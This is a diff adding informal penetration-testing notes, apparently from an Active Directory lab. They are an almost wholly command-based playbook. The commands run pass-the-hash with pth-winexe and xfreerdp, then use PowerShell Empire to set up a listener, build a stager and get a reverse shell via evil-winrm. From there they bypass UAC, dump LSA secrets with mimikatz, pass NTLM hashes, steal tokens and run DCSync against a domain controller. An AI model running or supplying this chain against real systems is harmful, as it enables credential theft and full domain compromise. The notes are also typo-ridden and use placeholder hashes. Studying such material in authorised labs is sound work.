@@ -1,0 +1,84 @@
+pth winexe and xfreerdp
+
+sudo pth-winexe -U pentesting s4vitar%a$ajefeuecert:ewrfvefecert // <ip> cmd.exe
+
+
+xfreerdp /u:savitar /pth:23e43r345fddg /d: pentesting.local /v:<ip or ip range by adding /24> 
+can be found for ip range that we got for domain  
+
+
+
+powershell empire 
+
+> lisetner
+listener)> options
+         > uselistener http
+listener/http)> info /options
+              > set name rabastudent
+              > set port 4449
+              > execute 
+              > back
+listener)> use stager
+
+stager)> use stager windows/launcher.bat 
+stager/windows/launcher)> set listener Rabastudent  
+                        > execute                 ------ o/p stored in /tmp/launcher.bat 
+                        
+                        
+now upload this file to windows machine using evil - winrm 
+
+As it is uploaded u will get reverse shell
+
+stager/windows/launcher)> back         
+          > listeners
+          > agents
+          > rename xavr26fuer stusentsrv        agent name renamed
+          
+          
+To run elevated powershell empire cmd you must have admin access or local andmin access
+         > agents                                           ---------o/p name: studentsrv username: studentsrv/raba and listener: rabastudent
+         
+         
+         Though it has admin access but it is not runnig as elevated since if it was running as elevated then there might be * after username to indicate elevated privileges
+         
+         
+         > interact rabastudent 
+         > help
+         > bypass uac rabastudent
+         > back
+         >list 
+         now you can see two agents   1  studentsrv  2  *GU3W343JWD  you can rename this rename GU3W343JWD adminstud  
+                                                     2  *adminstud   so this is elevagted agent
+                                                     
+         > interact adminstud
+         > shell net localgroup administrator
+         > usemodule 
+         > info 
+         > usemodule credentials/mimikatz/lsa_dump 
+         > run
+         
+         >                               /pth*
+         > set user administrator
+         > set ntlm <hash you got in prev step>
+         > set domain studentsrv
+         > run
+         > back
+         > shell dir \\ad \C$
+         > creds
+         > pth 2                       (2 is number that we get for creds )
+         > steal_token <PID>
+         
+         
+         >                               /logonpasswd
+         > interact rabastudent you can run it again if run/execute  cmd dont work 
+         > set agent adminstud
+         > run
+         
+         
+         > usemodule                     /dcsync
+         > set user jenkin
+         > set domain pentesting.local
+         > set dc <IP>
+         > interact rabastudent
+         > bypass uac rabastudent
+         
